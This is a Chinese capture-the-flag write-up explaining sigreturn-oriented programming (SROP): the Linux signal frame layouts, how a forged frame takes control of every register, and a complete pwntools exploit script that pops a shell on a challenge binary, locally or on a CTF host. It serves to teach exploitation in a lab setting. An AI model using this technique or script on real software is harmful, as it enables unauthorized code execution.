SQCTF的 当时只道是寻常 
TGCTF 的 norop 
之前就听队里师傅问我SROP学了没，这次刚好有个契机就学了
SROP(Sigreturn Oriented Programming)，简单来说就是通过系统调用号为0xf(sigreturn)的系统调用执行一个可以将所有寄存器赋值的函数来实现对所有寄存器的控制，从而直接执行某个函数的操作。
# Signal 机制
signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：
![[Pasted image 20250427151753.png]]
1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。
2. 内核会为该进程保存相应的上下文，**主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址**。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。**需要注意的是，这一部分是在用户进程的****地址空间****的。**之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。
对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext
- x86
```Plain
struct sigcontext{  
    unsigned short gs, __gsh;  
    unsigned short fs, __fsh;  
    unsigned short es, __esh;  
    unsigned short ds, __dsh;  
    unsigned long edi;  
    unsigned long esi;  
    unsigned long ebp;  
    unsigned long esp;  
    unsigned long ebx;  
    unsigned long edx;  
    unsigned long ecx;  
    unsigned long eax;  
    unsigned long trapno;  
    unsigned long err;  
    unsigned long eip;  
    unsigned short cs, __csh;  
    unsigned long eflags;  
    unsigned long esp_at_signal;  
    unsigned short ss, __ssh;  
    struct _fpstate * fpstate;  
    unsigned long oldmask;  
    unsigned long cr2;
};
```
- x64
```Plain
struct _fpstate{  
    /* FPU environment matching the 64-bit FXSAVE layout.  */  
    __uint16_t        cwd;  
    __uint16_t        swd;  
    __uint16_t        ftw;  
    __uint16_t        fop;  
    __uint64_t        rip;  
    __uint64_t        rdp;  
    __uint32_t        mxcsr;  
    __uint32_t        mxcr_mask;  
    struct _fpxreg    _st[8];  
    struct _xmmreg    _xmm[16];  
    __uint32_t        padding[24];
};
struct sigcontext{  
    __uint64_t r8;  
    __uint64_t r9;  
    __uint64_t r10;  
    __uint64_t r11;  
    __uint64_t r12;  
    __uint64_t r13;  
    __uint64_t r14;  
    __uint64_t r15;  
    __uint64_t rdi;  
    __uint64_t rsi;  
    __uint64_t rbp;  
    __uint64_t rbx;  
    __uint64_t rdx;  
    __uint64_t rax;  
    __uint64_t rcx;  
    __uint64_t rsp;  
    __uint64_t rip;  
    __uint64_t eflags;  
    unsigned short cs;  
    unsigned short gs;  
    unsigned short fs;  
    unsigned short __pad0;  
    __uint64_t err;  
    __uint64_t trapno;  
    __uint64_t oldmask;  
    __uint64_t cr2;  
    extension union    {      
        struct _fpstate * fpstate;      
        __uint64_t __fpstate_word;    
        };  
    __uint64_t __reserved1 [8];
};
```
![[Pasted image 20250427151907.png]]
3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。
# 利用
`SROP`的利用很简单，只需要攻击者可以控制栈空间，即可以向栈空间写入大量（长度至少包含构造的`fake frame`)数据，**然后控制****`rsp`****指向存有我们构造的****`fake frame`****，并控制****`rax`****为****`0xf`****，然后执行****`syscall`****就可以实现****`srop`****的攻击。**
注意是控制`rsp`指向`fake frame`的头部，其他指针除了`rax`外应该都无所谓。
实际构造时发现可能有些非寄存器的位置非零也不影响最后的执行，具体哪些还没细探究过，目前只知道最后两个位置应该不影响
`Fake frame`的构造`pwntools`库有现现成的，可以直接构造
```Python
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = binsh
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = 0x401045
```
这边用一题来举例
程序很简单
![[Pasted image 20250427151951.png]]
构造了三个函数，中间`read`，前后`write`，可以控制`rsi`，但无法控制`rdi`，有`0x400`的`read`，足够构造`SROP`链。
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = True
debug = True
if local:
    p = process('./pwn01')
    if debug:
        gdb.attach(p, gdbscript='b main')
else:
    ip ,port = "challenge.qsnctf.com:32442".split(":")
    p = remote(ip, port)

pop_rax = 0x40104a
binsh = 0x40203a
syscall = 0x40101d

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = binsh
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = 0x401045

payload = p64(0)
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(0x401042)
payload += bytes(frame1)
p.send(payload)

p.interactive()
```
这里我们直接贴 exp，结合 exp 讲
程序是直接有`binsh`的地址的，那么我们只需要构造 SROP，把他读入到栈上然后`syscall`就可以，那么要考虑的就是控制`rsi`的值，控制`rsi`的值就要用到最后一个`syscall`前面的`mov rsi, rsp;` rsp 始终是指向栈上的，那么我们只需要控制执行`syscall`的时候`rsp`刚好是我们构造的`fake frame`前面即可，这是很好做到的。
![[Pasted image 20250427152016.png]]
可以看到根据我们的 exp，`0x7ffd226a2338`处开始就是我们的`fake frame`，
![[Pasted image 20250427152025.png]]
执行到`syscall`的时`rsi`已经指向了`fake frame`的顶部，可以开始SROP
![[Pasted image 20250427152040.png]]
实际就可以根据我们构造的寄存器来执行`system("/bin/sh")`。